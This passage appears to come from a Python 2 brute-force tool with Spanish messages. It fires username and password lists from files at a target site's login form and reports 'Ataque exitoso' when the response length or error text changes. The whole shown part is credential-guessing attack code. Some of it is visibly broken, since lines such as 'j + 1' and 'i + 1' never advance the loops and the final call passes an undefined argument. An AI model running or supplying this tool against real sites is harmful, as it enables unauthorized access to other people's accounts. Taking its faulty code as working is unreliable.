print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
						
						j + 1
					else:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
						j + 1
						
				elif int(len(reqadm1.content)) == int(len(reqadm2.content)) and int(len(reqadm1.content)) == int(len(reqadm3.content)): # Si el Content-Lenght es igual
					if int(len(r.content)) == int(len(reqadm1.content)) and mbefore in r.content:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
						j + 1
					else:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
						j + 1
				else: # Si no se puede determinar mediante content-lenght
					if mbefore in r.text:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
					else:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
		i + 1	
	
def getParams(arg):
	parser = argparse.ArgumentParser(description='Fuerza Bruta',
		formatter_class=argparse.ArgumentDefaultsHelpFormatter)

	parser.add_argument('-b', '--bruteforce', help = 'URL Site', required=True)
	parser.add_argument('-f','--field', help = 'User and Password Field separated by space', required=True, nargs=2)
	parser.add_argument('-u', '--user', help = 'User account')
	parser.add_argument('-p', '--password', help='User\'s password')
	parser.add_argument('-U', '--users', help='File with users')
	parser.add_argument('-P', '--passwords', help='File with passwords')
	parser.add_argument('-m', '--message', help='Error message', required=True)
	
	options = parser.parse_args()
	
	if len(sys.argv) == 1:
		print parser.print_help()
	
	if options.user is None and options.password is None and options.users is not None and options.passwords is not None:
		doubleFile(options.bruteforce,options.field[0],options.field[1],'','',options.users,options.passwords,options.message)
	elif options.password is None and options.users is None and options.user is not None and options.passwords is not None:
		pwdFile(options.bruteforce,options.field[0],options.field[1],options.user,'','',options.passwords,options.message)
	elif options.user is None and options.passwords is None and options.users is not None and options.password is not None:
		usersFile(options.bruteforce,options.field[0],options.field[1],'',options.password,options.users,'',options.message)
	elif options.users is None and options.passwords is None and options.user is not None and options.password is not None:
		single(options.bruteforce,options.field[0],options.field[1],options.user,options.password,'','',options.message)
	elif options.user is None and options.users is None or options.password is None and options.passwords is None:
		print parser.print_help()

		
getParams(arg)
